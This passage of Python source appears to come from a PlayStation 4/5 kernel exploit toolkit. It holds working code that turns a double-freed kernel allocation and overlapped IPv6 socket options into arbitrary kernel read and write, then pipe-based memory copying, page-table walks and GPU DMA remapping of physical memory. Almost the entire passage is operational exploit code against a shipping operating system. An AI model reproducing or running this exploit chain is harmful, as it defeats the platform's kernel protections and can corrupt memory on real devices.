        res = u64_to_i64(sc.syscalls.pipe(get_ref_addr(pipe_fds)))
        if res == -1:
            raise Exception(
                "pipe error: %d\n%s"
                % (sc.syscalls.pipe.errno, sc.syscalls.pipe.get_error_string())
            )

        read_fd = struct.unpack("<I", pipe_fds[0:4])[0]
        write_fd = struct.unpack("<I", pipe_fds[4:8])[0]

        self.pipe_read_fd = read_fd
        self.pipe_write_fd = write_fd
        self.pipe_addr = self.get_fd_data_addr(read_fd)
        self.pipemap_buffer = alloc(0x14)
        self.read_mem = alloc(PAGE_SIZE)

    # overlap the pktopts of two IPV6 sockets
    def create_overlapped_ipv6_sockets(self):
        master_target_buf = alloc(0x14)
        slave_buf = alloc(0x14)
        pktinfo_size_store = alloc(8)

        pktinfo_size_store[0:8] = struct.pack("<Q", 0x14)

        master_sock = sc.syscalls.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
        victim_sock = sc.syscalls.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)

        sc.syscalls.setsockopt(
            master_sock,
            IPPROTO_IPV6,
            IPV6_PKTINFO,
            master_target_buf,
            0x14,
        )
        sc.syscalls.setsockopt(
            victim_sock,
            IPPROTO_IPV6,
            IPV6_PKTINFO,
            slave_buf,
            0x14,
        )

        master_so = self.get_fd_data_addr(master_sock)
        master_pcb = self.kread8(master_so + SELECTED_KERNEL_OFFSETS["SO_PCB"])
        master_pktopts = self.kread8(
            master_pcb + SELECTED_KERNEL_OFFSETS["INPCB_PKTOPTS"]
        )

        slave_so = self.get_fd_data_addr(victim_sock)
        slave_pcb = self.kread8(slave_so + SELECTED_KERNEL_OFFSETS["SO_PCB"])
        slave_pktopts = self.kread8(
            slave_pcb + SELECTED_KERNEL_OFFSETS["INPCB_PKTOPTS"]
        )

        # magic
        self.kwrite8(master_pktopts + 0x10, slave_pktopts + 0x10)

        self.master_target_buf = master_target_buf
        self.slave_buf = slave_buf
        self.pktinfo_size_store = pktinfo_size_store
        self.master_sock = master_sock
        self.victim_sock = victim_sock

    def ipv6_write_to_victim(self, kaddr):
        self.master_target_buf[0:8] = struct.pack("<Q", kaddr)
        self.master_target_buf[8:0x10] = struct.pack("<Q", 0)
        self.master_target_buf[0x10:0x14] = struct.pack("<I", 0)
        sc.syscalls.setsockopt(
            self.master_sock,
            IPPROTO_IPV6,
            IPV6_PKTINFO,
            get_ref_addr(self.master_target_buf),
            0x14,
        )

    def ipv6_kread(self, kaddr, buffer_addr):
        self.ipv6_write_to_victim(kaddr)
        sc.syscalls.getsockopt(
            self.victim_sock,
            IPPROTO_IPV6,
            IPV6_PKTINFO,
            buffer_addr,
            self.pktinfo_size_store,
        )

    def ipv6_kwrite(self, kaddr, buffer_addr):
        self.ipv6_write_to_victim(kaddr)
        sc.syscalls.setsockopt(
            self.victim_sock,
            IPPROTO_IPV6,
            IPV6_PKTINFO,
            buffer_addr,
            0x14,
        )

    def ipv6_kread8(self, kaddr):
        self.ipv6_kread(kaddr, get_ref_addr(self.slave_buf))
        return struct.unpack("<Q", self.slave_buf[0:8])[0]

    def copyout(self, kaddr, uaddr, len):
        assert kaddr and uaddr and len

        self.pipemap_buffer[0:8] = struct.pack("<Q", 0x4000000040000000)
        self.pipemap_buffer[8:16] = struct.pack("<Q", 0x4000000000000000)
        self.pipemap_buffer[16:20] = struct.pack("<I", 0)
        self.ipv6_kwrite(self.pipe_addr, get_ref_addr(self.pipemap_buffer))

        self.pipemap_buffer[0:8] = struct.pack("<Q", kaddr)
        self.pipemap_buffer[8:16] = struct.pack("<Q", 0)
        self.pipemap_buffer[16:20] = struct.pack("<I", 0)
        self.ipv6_kwrite(self.pipe_addr + 0x10, get_ref_addr(self.pipemap_buffer))

        sc.syscalls.read(self.pipe_read_fd, uaddr, len)

    def copyin(self, uaddr, kaddr, len):
        assert kaddr and uaddr and len

        self.pipemap_buffer[0:8] = struct.pack("<Q", 0)
        self.pipemap_buffer[8:16] = struct.pack("<Q", 0x4000000000000000)
        self.pipemap_buffer[16:20] = struct.pack("<I", 0)
        self.ipv6_kwrite(self.pipe_addr, get_ref_addr(self.pipemap_buffer))

        self.pipemap_buffer[0:8] = struct.pack("<Q", kaddr)
        self.pipemap_buffer[8:16] = struct.pack("<Q", 0)
        self.pipemap_buffer[16:20] = struct.pack("<I", 0)
        self.ipv6_kwrite(self.pipe_addr + 0x10, get_ref_addr(self.pipemap_buffer))

        sc.syscalls.write(self.pipe_write_fd, uaddr, len)

    def read_buffer(self, kaddr, len):
        mem = self.read_mem
        if len > PAGE_SIZE:
            mem = alloc(len)

        self.copyout(kaddr, get_ref_addr(mem), len)
        return readbuf(mem, len)

    def write_buffer(self, kaddr, buf):
        self.copyin(get_ref_addr(buf), kaddr, len(buf))


class Kernel(object):
    def __init__(self):
        self.curproc_addr = 0
        self.curproc_fd_addr = 0
        self.curproc_ofiles_addr = 0
        self.inside_kdata_addr = 0
        self.data_base = 0

        self.read_buffer = lambda kaddr, len: bytearray(len)
        self.write_buffer = lambda kaddr, buf: None

        # ps4
        self.is_ps4_kpatches_applied = False

        # ps5
        self.allproc_addr = 0
        self.base_addr = 0
        self.dmap_base_addr = 0
        self.kernel_cr3_addr = 0

    def read_byte(self, kaddr):
        value = self.read_buffer(kaddr, 1)
        return struct.unpack("<B", value)[0]

    def read_word(self, kaddr):
        value = self.read_buffer(kaddr, 2)
        return struct.unpack("<H", value)[0]

    def read_dword(self, kaddr):
        value = self.read_buffer(kaddr, 4)
        return struct.unpack("<I", value)[0]

    def read_qword(self, kaddr):
        value = self.read_buffer(kaddr, 8)
        return struct.unpack("<Q", value)[0]

    def read_null_terminated_string(self, kaddr):
        result = b""
        while True:
            char = self.read_buffer(kaddr, 1)
            if char == b"\0":
                break
            result += char
            kaddr += 1
        return result

    def write_byte(self, kaddr, value):
        buf = struct.pack("<B", value)
        self.write_buffer(kaddr, buf)

    def write_word(self, kaddr, value):
        buf = struct.pack("<H", value)
        self.write_buffer(kaddr, buf)

    def write_dword(self, kaddr, value):
        buf = struct.pack("<I", value)
        self.write_buffer(kaddr, buf)

    def write_qword(self, kaddr, value):
        buf = struct.pack("<Q", value)
        self.write_buffer(kaddr, buf)


kernel = Kernel()


def phys_to_dmap(phys_addr):
    return kernel.dmap_base_addr + phys_addr


def cpu_pde_field(pde, field):
    shift = CPU_PDE_SHIFT[field]
    mask = CPU_PDE_MASKS[field]
    return (pde >> shift) & mask


def cpu_walk_pt(cr3, vaddr):
    pml4e_index = (vaddr >> 39) & 0x1FF
    pdpe_index = (vaddr >> 30) & 0x1FF
    pde_index = (vaddr >> 21) & 0x1FF
    pte_index = (vaddr >> 12) & 0x1FF

    # pml4
    pml4e = kernel.read_qword(phys_to_dmap(cr3) + (pml4e_index * 8))
    if cpu_pde_field(pml4e, "PRESENT") != 1:
        return None

    # pdp
    pdp_base_pa = pml4e & CPU_PG_PHYS_FRAME
    pdpe_va = phys_to_dmap(pdp_base_pa) + (pdpe_index * 8)
    pdpe = kernel.read_qword(pdpe_va)

    if cpu_pde_field(pdpe, "PRESENT") != 1:
        return None

    # pd
    pd_base_pa = pdpe & CPU_PG_PHYS_FRAME
    pde_va = phys_to_dmap(pd_base_pa) + (pde_index * 8)
    pde = kernel.read_qword(pde_va)

    if cpu_pde_field(pde, "PRESENT") != 1:
        return None

    # large page
    if cpu_pde_field(pde, "PS") == 1:
        return (pde & CPU_PG_PS_FRAME) | (vaddr & 0x1FFFFF)

    # pt

    pt_base_pa = pde & CPU_PG_PHYS_FRAME
    pte_va = phys_to_dmap(pt_base_pa) + (pte_index * 8)
    pte = kernel.read_qword(pte_va)

    if cpu_pde_field(pte, "PRESENT") != 1:
        return None

    return (pte & CPU_PG_PHYS_FRAME) | (vaddr & 0x3FFF)


# it's dangerous because it doesn't check if you're jailbroken
def dangerous_get_proc_cr3(proc):
    vmspace = kernel.read_qword(proc + SELECTED_KERNEL_OFFSETS["PROC_VM_SPACE"])
    pmap_store = kernel.read_qword(vmspace + SELECTED_KERNEL_OFFSETS["VMSPACE_VM_PMAP"])

    return kernel.read_qword(pmap_store + SELECTED_KERNEL_OFFSETS["PMAP_CR3"])


def dangerous_virt_to_phys(virt_addr, cr3=kernel.kernel_cr3_addr):
    return cpu_walk_pt(cr3, virt_addr)


def dangerous_dlsym(mod, symbol):
    out_buf = alloc(8)
    symbol = symbol + b"\0"

    if u64_to_i64(sc.syscalls.dlsym(mod, symbol, out_buf)) == -1:
        raise Exception(
            "dlsym error: %d\n%s"
            % (sc.syscalls.dlsym.errno, sc.syscalls.dlsym.get_error_string())
        )

    return struct.unpack("<Q", out_buf[0:8])[0]


def find_mod_by_name(name):
    sceKernelGetModuleListInternal = dangerous_dlsym(
        sc.libkernel_addr, "sceKernelGetModuleListInternal"
    )
    sceKernelGetModuleInfo = dangerous_dlsym(
        sc.libkernel_addr, "sceKernelGetModuleInfo"
    )

    mem = alloc(4 * 0x300)
    actual_num = alloc(8)

    sc.make_function_if_needed(
        "sceKernelGetModuleListInternal", sceKernelGetModuleListInternal
    )(mem, 0x300, actual_num)

    num = struct.unpack("<Q", actual_num[0:8])[0]
    for i in range(num):
        handle = struct.unpack("<I", mem[i * 4 : i * 4 + 4])[0]
        info = alloc(0x160)
        info[0:8] = struct.pack("<Q", 0x160)

        sc.make_function_if_needed("sceKernelGetModuleInfo", sceKernelGetModuleInfo)(
            handle, info
        )

        mod_name = get_cstring(info, 8)
        if mod_name == name:
            base_addr = struct.unpack("<Q", info[0x108:0x110])[0]
            return handle, base_addr

    return 0, 0


class GPU(object):
    def __init__(self):
        self.dmem_size = 2 * 0x100000

        libSceGnmDriver, _ = find_mod_by_name("libSceGnmDriverForNeoMode.sprx")

        # put these into global to make life easier
        self.sceKernelAllocateMainDirectMemory = sc.make_function_if_needed(
            "sceKernelAllocateMainDirectMemory",
            dangerous_dlsym(sc.libkernel_addr, "sceKernelAllocateMainDirectMemory"),
        )
        self.sceKernelMapDirectMemory = sc.make_function_if_needed(
            "sceKernelMapDirectMemory",
            dangerous_dlsym(sc.libkernel_addr, "sceKernelMapDirectMemory"),
        )
        self.sceGnmSubmitCommandBuffers = sc.make_function_if_needed(
            "sceGnmSubmitCommandBuffers",
            dangerous_dlsym(libSceGnmDriver, "sceGnmSubmitCommandBuffers"),
        )
        self.sceGnmSubmitDone = sc.make_function_if_needed(
            "sceGnmSubmitDone", dangerous_dlsym(libSceGnmDriver, "sceGnmSubmitDone")
        )

        prot_ro = PROT_READ | PROT_WRITE | GPU_READ
        prot_rw = prot_ro | GPU_WRITE

        victim_va, _ = self.alloc_main_dmem(self.dmem_size, prot_rw, MAP_NO_COALESCE)
        transfer_va, _ = self.alloc_main_dmem(self.dmem_size, prot_rw, MAP_NO_COALESCE)
        cmd_va, _ = self.alloc_main_dmem(self.dmem_size, prot_ro, MAP_NO_COALESCE)

        curproc_cr3 = dangerous_get_proc_cr3(kernel.curproc_addr)
        victim_real_pa = dangerous_virt_to_phys(victim_va, curproc_cr3)

        victim_ptbe_va, page_size = self.get_ptb_entry_of_relative_va(victim_va)

        if victim_ptbe_va is None or page_size != self.dmem_size:
            raise Exception("failed to setup gpu primitives")

        if u64_to_i64(sc.syscalls.mprotect(victim_va, self.dmem_size, prot_ro)) == -1:
            raise Exception(
                "mprotect failed: %d\n%s"
                % (sc.syscalls.mprotect.errno, sc.syscalls.mprotect.get_error_string())
            )

        initial_victim_ptbe_for_ro = kernel.read_qword(victim_ptbe_va)
        cleared_victim_ptbe_for_ro = initial_victim_ptbe_for_ro & ~victim_real_pa

        self.victim_va = victim_va
        self.transfer_va = transfer_va
        self.cmd_va = cmd_va
        self.victim_ptbe_va = victim_ptbe_va
        self.cleared_victim_ptbe_for_ro = cleared_victim_ptbe_for_ro

    def pm4_type3_header(self, opcode, count):
        packet_type = 3
        shader_type = 1  # computer shader
        predicate = 0  # predicate disable

        return (
            predicate & 0
            | (shader_type & 1) << 1
            | (opcode & 0xFF) << 8
            | ((count - 1) & 0x3FFF) << 16
            | (packet_type & 3) << 30
        )

    def pm4_dma_data(self, dest_va, src_va, length):
        count = 6
        bufsize = 4 * (count + 1)
        opcode = 0x50
        command_len = length & 0x1FFFFF

        pm4 = alloc(bufsize)
        dma_data_header = (
            0 & 1  # engine
            | (0 & 1) << 12  # src_atc
            | (2 & 3) << 13  # src_cache_policy
            | (1 & 1) << 15  # src_volatile
            | (0 & 3) << 20  # dst_sel (DmaDataDst enum)
            | (0 & 1) << 24  # dst_atc
            | (2 & 3) << 25  # dst_cache_policy
            | (1 & 1) << 27  # dst_volatile
            | (0 & 3) << 29  # src_sel (DmaDataSrc enum)
            | (1 & 1) << 31  # cp_sync
        )
        pm4[0:4] = struct.pack("<I", self.pm4_type3_header(opcode, count))  # pm4 header
        pm4[4:8] = struct.pack(
            "<I", dma_data_header
        )  # dma data header (copy: mem -> mem)
        pm4[8:16] = struct.pack("<Q", src_va)
        pm4[16:24] = struct.pack("<Q", dest_va)
        pm4[24:28] = struct.pack("<I", command_len)

        return pm4

    def submit_dma_data_command(self, dest_va, src_va, size):
        dcb_count = 1
        dcb_gpu_addr = alloc(dcb_count * 8)
        dcb_sizes_in_bytes = alloc(dcb_count * 4)

        # prep command buf
        dma_data = self.pm4_dma_data(dest_va, src_va, size)
        sc.mem[self.cmd_va - 0x1000 : self.cmd_va - 0x1000 + len(dma_data)] = dma_data

        # prep param
        dcb_gpu_addr[0:8] = struct.pack("<Q", self.cmd_va)
        dcb_sizes_in_bytes[0:4] = struct.pack("<I", len(dma_data))

        # submit to gpu

        ret = self.sceGnmSubmitCommandBuffers(
            dcb_count,
            dcb_gpu_addr,
            dcb_sizes_in_bytes,
            0,
            0,
        )
        if ret != 0:
            raise Exception("sceGnmSubmitCommandBuffers error: %s" % hex(ret))

        # inform gpu that current submission is done
        ret = self.sceGnmSubmitDone(0)
        if ret != 0:
            raise Exception("sceGnmSubmitDone error: %s" % hex(ret))

    def transfer_physical_buffer(self, phys_addr, size, is_write=False):
        trunc_phys_addr = phys_addr & ~(self.dmem_size - 1)
        offset = phys_addr - trunc_phys_addr

        if offset + size > self.dmem_size:
            raise Exception(
                "error: trying to write more than direct memory size: %s", size
            )

        prot_ro = PROT_READ | PROT_WRITE | GPU_READ
        prot_rw = prot_ro | GPU_WRITE

        # remap PTD

        if (
            u64_to_i64(
                sc.syscalls.mprotect(
                    self.victim_va,
                    self.dmem_size,
                    prot_ro,
                )
            )
            == -1
        ):
            raise Exception(
                "mprotect failed: %d\n%s"
                % (sc.syscalls.mprotect.errno, sc.syscalls.mprotect.get_error_string())
            )

        new_ptb = self.cleared_victim_ptbe_for_ro | trunc_phys_addr
        kernel.write_qword(self.victim_ptbe_va, new_ptb)

        if (
            u64_to_i64(
                sc.syscalls.mprotect(
                    self.victim_va,
                    self.dmem_size,
                    prot_rw,
                )
            )
            == -1
        ):
            raise Exception(
                "mprotect failed: %d\n%s"
                % (sc.syscalls.mprotect.errno, sc.syscalls.mprotect.get_error_string())
            )

        if is_write:
            src = self.transfer_va
            dest = self.victim_va + offset
        else:
            src = self.victim_va + offset
            dest = self.transfer_va

        self.submit_dma_data_command(dest, src, size)

    def read_buffer(self, addr, size):
        phys_addr = dangerous_virt_to_phys(addr)
        if phys_addr is None:
            raise Exception("failed to translate %s to physical addr" % hex(addr))

        self.transfer_physical_buffer(phys_addr, size, is_write=False)
        return self.transfer_va[0:size]

    def write_buffer(self, addr, buf):
        phys_addr = dangerous_virt_to_phys(addr)
        if phys_addr is None:
            raise Exception("failed to translate %s to physical addr" % hex(addr))

        self.transfer_va[0 : len(buf)] = buf
        self.transfer_physical_buffer(phys_addr, len(buf), is_write=True)

    def read_byte(self, dest):
        buf = self.read_buffer(dest, 1)
        return struct.unpack("<B", buf)[0]

    def read_word(self, dest):
        buf = self.read_buffer(dest, 4)
        return struct.unpack("<I", buf)[0]

    def read_dword(self, dest):
        buf = self.read_buffer(dest, 4)
        return struct.unpack("<I", buf)[0]

    def read_qword(self, dest):
        buf = self.read_buffer(dest, 8)
        return struct.unpack("<Q", buf)[0]

    def write_byte(self, dest, value):
        buf = struct.pack("<B", value)
        self.write_buffer(dest, buf)

    def write_word(self, dest, value):
        buf = struct.pack("<I", value)
        self.write_buffer(dest, buf)

    def write_dword(self, dest, value):
        buf = struct.pack("<I", value)
        self.write_buffer(dest, buf)

    def write_qword(self, dest, value):
        buf = struct.pack("<Q", value)
        self.write_buffer(dest, buf)

    def gpu_pde_field(self, pde, field):
        shift = GPU_PDE_SHIFT[field]
        mask = GPU_PDE_MASKS[field]
        return (pde >> shift) & mask

    def gpu_walk_pt(self, vmid, virt_addr):
        pdb2_addr = self.get_pdb2_addr(vmid)

        pml4e_index = (virt_addr >> 39) & 0x1FF
        pdpe_index = (virt_addr >> 30) & 0x1FF
        pde_index = (virt_addr >> 21) & 0x1FF

        # pdb2
        pml4e = kernel.read_qword(phys_to_dmap(pdb2_addr) + (pml4e_index * 8))
        if self.gpu_pde_field(pml4e, "VALID") != 1:
            return None, None

        # pdb1
        pdp_base_pa = pml4e & GPU_PDE_ADDR_MASK
        pdpe_va = phys_to_dmap(pdp_base_pa) + (pdpe_index * 8)
        pdpe = kernel.read_qword(pdpe_va)

        if self.gpu_pde_field(pdpe, "VALID") != 1:
            return None, None

        # pdb0

        pdp_base_pa = pdpe & GPU_PDE_ADDR_MASK
        pde_va = phys_to_dmap(pdp_base_pa) + (pde_index * 8)
        pde = kernel.read_qword(pde_va)

        if self.gpu_pde_field(pde, "VALID") != 1:
            return None, None

        if self.gpu_pde_field(pde, "IS_PTE") == 1:
            return pde_va, 0x200000  # 2mb

        # ptb

        fragment_size = self.gpu_pde_field(pde, "BLOCK_FRAGMENT_SIZE")
        offset = virt_addr & 0x1FFFFF
        pt_base_pa = pde & GPU_PDE_ADDR_MASK

        pte_index, pte, pte_va, page_size = None, None, None, None
        if fragment_size == 4:
            pte_index = offset >> 16
            pte_va = phys_to_dmap(pt_base_pa) + (pte_index * 8)
            pte = kernel.read_qword(pte_va)

            if (
                self.gpu_pde_field(pte, "VALID") == 1
                and self.gpu_pde_field(pte, "TF") == 1
            ):
                pte_index = (virt_addr & 0xFFFF) >> 13
                pte_va = phys_to_dmap(pt_base_pa) + (pte_index * 8)
                page_size = 0x2000  # 8kb
            else:
                page_size = 0x10000  # 64kb
        elif fragment_size == 1:
            pte_index = offset >> 13
            pte_va = phys_to_dmap(pt_base_pa) + (pte_index * 8)
            page_size = 0x2000  # 8kb

        return pte_va, page_size

    def alloc_main_dmem(self, size, prot, flag):
        out = alloc(8)
        mem_type = 1

        ret = self.sceKernelAllocateMainDirectMemory(size, mem_type, out)
        if ret != 0:
            raise Exception("sceKernelAllocateMainDirectMemory error: %d" % (ret))

        phys_addr = struct.unpack("<Q", out[0:8])[0]

        out[0:8] = "\0" * 8

        ret = self.sceKernelMapDirectMemory(out, size, prot, flag, phys_addr, size)
        if ret != 0:
            raise Exception("sceKernelMapDirectMemory error: %d" % (ret))

        virt_addr = struct.unpack("<Q", out[0:8])[0]
        return virt_addr, phys_addr

    def get_curproc_vmid(self):
        vmspace = kernel.read_qword(
            kernel.curproc_addr + SELECTED_KERNEL_OFFSETS["PROC_VM_SPACE"]
        )
        vmid = kernel.read_dword(vmspace + SELECTED_KERNEL_OFFSETS["VMSPACE_VM_VMID"])
        return vmid

    def get_gvmspace(self, vmid):
        gvmspace_base = (
            kernel.data_base + SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_GVMSPACE"]
        )
        return gvmspace_base + (vmid * SELECTED_KERNEL_OFFSETS["SIZEOF_GVMSPACE"])

    def get_pdb2_addr(self, vmid):
        gvmspace = self.get_gvmspace(vmid)
        return kernel.read_qword(
            gvmspace + SELECTED_KERNEL_OFFSETS["GVMSPACE_PAGE_DIR_VA"]
        )

    def get_relative_va(self, vmid, va):
        gvmspace = self.get_gvmspace(vmid)

        size = kernel.read_qword(gvmspace + SELECTED_KERNEL_OFFSETS["GVMSPACE_SIZE"])
        start_addr = kernel.read_qword(
            gvmspace + SELECTED_KERNEL_OFFSETS["GVMSPACE_START_VA"]
        )
        end_addr = start_addr + size

        if va >= start_addr and va < end_addr:
            offset = va - start_addr
            return offset

        return None

    def get_ptb_entry_of_relative_va(self, virt_addr):
        vmid = self.get_curproc_vmid()
        relative_va = self.get_relative_va(vmid, virt_addr)

        if relative_va is None:
            raise Exception(
                "invalid virtual addr %s for vmid %d" % (hex(virt_addr), vmid)
            )

        return self.gpu_walk_pt(vmid, relative_va)


# credit: @hammer-83
def find_vmspace_pmap_offset():
    vmspace = kernel.read_qword(
        kernel.curproc_addr + SELECTED_KERNEL_OFFSETS["PROC_VM_SPACE"]
    )

    # Note, this is the offset of vm_space.vm_map.pmap on 1.xx
    # It is assumed that on higher firmwares it's only increasing.
    cur_scan_offset = 0x1D0

    for i in range(6):
        scan_offset = cur_scan_offset + (i * 8)
        scan_val = kernel.read_qword(vmspace + scan_offset)
        offset_diff = scan_val - vmspace
        if offset_diff >= 0x2C0 and offset_diff <= 0x2F0:
            return scan_offset

    raise Exception("failed to find VMSPACE_VM_PMAP offset")


# credit: @hammer-83
def find_vmspace_vmid_offset():
    vmspace = kernel.read_qword(
        kernel.curproc_addr + SELECTED_KERNEL_OFFSETS["PROC_VM_SPACE"]
    )

    # Note, this is the offset of vm_space.vm_map.vmid on 1.xx
    # It is assumed that on higher firmwares it's only increasing.
    cur_scan_offset = 0x1D8

    for i in range(8):
        scan_offset = cur_scan_offset + (i * 4)
        scan_val = kernel.read_dword(vmspace + scan_offset)
        if scan_val > 0 and scan_val <= 0x10:
            return scan_offset

    raise Exception("failed to find VMSPACE_VM_VMID offset")


def find_proc_offsets():
    proc_data = readbuf(kernel.curproc_addr, 0x1000)

    p_comm_pattern = [0xCE, 0xFA, 0xEF, 0xBE, 0xCC, 0xBB]
    p_comm_sign = 0
    limit = len(proc_data) - len(p_comm_pattern) + 1
    for idx in range(limit):
        for off, val in enumerate(p_comm_pattern):
            if val is not None and proc_data[idx + off] != val:
                break
        else:
            p_comm_sign = kernel.curproc_addr + idx
            break
    p_sysent_pattern = [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F]
    p_sysent_sign = 0
    limit = len(proc_data) - len(p_sysent_pattern) + 1
    for idx in range(limit):
        for off, val in enumerate(p_sysent_pattern):
            if val is not None and proc_data[idx + off] != val:
                break
        else:
            p_sysent_sign = kernel.curproc_addr + idx
            break

    if p_comm_sign == 0:
        raise Exception("failed to find offset for PROC_COMM")
    if p_sysent_sign == 0:
        raise Exception("failed to find offset for PROC_SYSENT")

    p_comm_offset = p_comm_sign - 1 + 0x8
    p_sysent_offset = p_sysent_sign - 1 - 0x10

    return p_comm_offset, p_sysent_offset


def find_additional_offsets():
    PROC_COMM, PROC_SYSENT = find_proc_offsets()

    vm_map_pmap_offset = 0
    vm_map_vmid_offset = 0

    # not tested on ps4. ignore for now.
    # maybe can just hardcode if offset is not changes between fw on ps4
    if sc.platform == "ps5":
        vm_map_pmap_offset = find_vmspace_pmap_offset()
        vm_map_vmid_offset = find_vmspace_vmid_offset()

    SELECTED_KERNEL_OFFSETS["PROC_COMM"] = PROC_COMM
    SELECTED_KERNEL_OFFSETS["PROC_SYSENT"] = PROC_SYSENT
    SELECTED_KERNEL_OFFSETS["VMSPACE_MAP_PMAP"] = vm_map_pmap_offset
    SELECTED_KERNEL_OFFSETS["VMSPACE_MAP_VMID"] = vm_map_vmid_offset


# k100_addr is double freed 0x100 malloc zone address
# dirty_sd is the socket whose rthdr pointer is corrupt
# kernel_addr is the address of the "evf cv" string


def make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_info_addr):
    master_sock = pktopts_sds[0]
    tclass = alloc(4)
    off_tclass = 0xB0 if sc.platform == "ps4" else 0xC0

    pktopts_size = 0x100
    pktopts = alloc(pktopts_size)
    rsize = build_rthdr(get_ref_addr(pktopts), pktopts_size)
    pktinfo_p = k100_addr + 0x100

    # pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
    pktopts[off_tclass + 0x10 : off_tclass + 0x18] = struct.pack("<Q", pktinfo_p)

    print("overwrite main pktopts")
    reclaim_sock = None

    sc.syscalls.close(pktopts_sds[1])

    for i in range(NUM_ALIAS):
        for j in range(len(sds_alt)):
            # if a socket doesn't have a pktopts, setting the rthdr will make one.
            # the new pktopts might reuse the memory instead of the rthdr.
            # make sure the sockets already have a pktopts before
            pktopts[off_tclass : off_tclass + 4] = struct.pack("<I", 0x4141 | (j << 16))
            set_rthdr(sds_alt[j], pktopts, rsize)

        gsockopt(master_sock, IPPROTO_IPV6, IPV6_TCLASS, get_ref_addr(tclass), 4)
        marker = struct.unpack("<I", tclass[0:4])[0]
        if marker & 0xFFFF == 0x4141:
            print("found reclaim sd at attempt: %d" % (i + 1))
            idx = marker >> 16
            reclaim_sock = sds_alt[idx]
            sds_alt.remove(reclaim_sock)
            break

    if reclaim_sock is None:
        raise Exception("failed to overwrite main pktopts")

    pktinfo_len = 0x14
    pktinfo = alloc(pktinfo_len)
    pktinfo[0:8] = struct.pack("<Q", pktinfo_p)

    read_buf = alloc(8)

    def slow_kread8(addr):
        len = 8
        offset = 0

        while offset < len:
            # pktopts.ip6po_nhinfo = addr + offset
            pktinfo[0x8 : 0x8 + 8] = struct.pack("<Q", addr + offset)

            ssockopt(
                master_sock,
                IPPROTO_IPV6,
                IPV6_PKTINFO,
                get_ref_addr(pktinfo),
                pktinfo_len,
            )
            n = gsockopt(
                master_sock,
                IPPROTO_IPV6,
                IPV6_NEXTHOP,
                get_ref_addr(read_buf) + offset,
                len - offset,
            )

            if n == 0:
                read_buf[offset : offset + 1] = b"\0"
                offset += 1
            else:
                offset += n

        return struct.unpack("<Q", read_buf[0:8])[0]

    print('slow_kread8(&"evf cf"): %s' % hex(slow_kread8(kernel_addr)))
    kstr = get_cstring(read_buf)
    print('*(&"evf cv"): %s' % kstr)

    if kstr != "evf cv":
        raise Exception('test read of &"evf cv" failed')

    print("slow arbitrary kernel read achieved")

    # we are assuming that previously freed aio_info still contains addr to curproc
    curproc = slow_kread8(aio_info_addr + 8)

    if curproc >> 48 != 0xFFFF:
        raise Exception("invalid curproc kernel address: %s" % hex(curproc))

    possible_pid = slow_kread8(curproc + SELECTED_KERNEL_OFFSETS["PROC_PID"])
    current_pid = sc.syscalls.getpid()

    # TODO: check if this is the right implementation
    if possible_pid != current_pid:
        raise Exception("curproc verification failed: %s" % hex(curproc))

    print("curproc = %s" % hex(curproc))

    kernel.curproc_addr = curproc
    kernel.curproc_fd_addr = slow_kread8(
        kernel.curproc_addr + SELECTED_KERNEL_OFFSETS["PROC_FD"]
    )  # p_fd (filedesc)
    kernel.curproc_ofiles_addr = (
        slow_kread8(kernel.curproc_fd_addr) + SELECTED_KERNEL_OFFSETS["FILEDESC_OFILES"]
    )
    kernel.inside_kdata_addr = kernel_addr

    def get_fd_data_addr(sock, kread8_fn):
        filedescent_addr = (
            kernel.curproc_ofiles_addr
            + sock * SELECTED_KERNEL_OFFSETS["FILEDESC_OFILES"]
        )
        file_addr = kread8_fn(filedescent_addr)  # fde_file
        return kread8_fn(file_addr)  # f_data

    def get_sock_pktopts(sock, kread8_fn):
        fd_data = get_fd_data_addr(sock, kread8_fn)
        pcb = kread8_fn(fd_data + SELECTED_KERNEL_OFFSETS["SO_PCB"])
        pktopts = kread8_fn(pcb + SELECTED_KERNEL_OFFSETS["INPCB_PKTOPTS"])
        return pktopts

    worker_sock = new_socket()
    worker_pktinfo = alloc(pktinfo_len)

    # create pktopts on worker_sock
    ssockopt(
        worker_sock,
        IPPROTO_IPV6,
        IPV6_PKTINFO,
        get_ref_addr(worker_pktinfo),
        pktinfo_len,
    )

    worker_pktopts = get_sock_pktopts(worker_sock, slow_kread8)

    pktinfo[0:8] = struct.pack("<Q", worker_pktopts + 0x10)  # overlap pktinfo
    pktinfo[0x8:0x10] = struct.pack("<Q", 0)  # clear .ip6po_nexthop
    ssockopt(
        master_sock, IPPROTO_IPV6, IPV6_PKTINFO, get_ref_addr(pktinfo), pktinfo_len
    )

    def kread20(addr, buf):
        pktinfo[0:8] = struct.pack("<Q", addr)
        ssockopt(
            master_sock, IPPROTO_IPV6, IPV6_PKTINFO, get_ref_addr(pktinfo), pktinfo_len
        )
        gsockopt(
            worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, get_ref_addr(buf), pktinfo_len
        )

    def kwrite20(addr, buf):
        pktinfo[0:8] = struct.pack("<Q", addr)
        ssockopt(
            master_sock, IPPROTO_IPV6, IPV6_PKTINFO, get_ref_addr(pktinfo), pktinfo_len
        )
        ssockopt(
            worker_sock,
            IPPROTO_IPV6,
            IPV6_PKTINFO,
            get_ref_addr(worker_pktinfo),
            pktinfo_len,
        )

    def kread8(addr):
        kread20(addr, worker_pktinfo)
        return struct.unpack("<Q", worker_pktinfo[0:8])[0]

    def restricted_kwrite8(addr, val):
        worker_pktinfo[0:8] = struct.pack("<Q", val)
        worker_pktinfo[8:16] = b"\0" * 8
        worker_pktinfo[16:20] = b"\0" * 4
        kwrite20(addr, worker_pktinfo)

    read_buf[0:8] = struct.pack("<Q", kread8(kernel_addr))

    kstr = get_cstring(read_buf)
    if kstr != "evf cv":
        raise Exception('test read of &"evf cv" failed')

    print("restricted kernel r/w achieved")

    # `restricted_kwrite8` will overwrites other pktopts fields (up to 20 bytes), but that is fine
    ipv6_kernel_rw = IPv6KernelRW(
        kernel.curproc_ofiles_addr, kread8, restricted_kwrite8
    )

    kernel.read_buffer = ipv6_kernel_rw.read_buffer
    kernel.write_buffer = ipv6_kernel_rw.write_buffer

    kstr = kernel.read_null_terminated_string(kernel_addr)
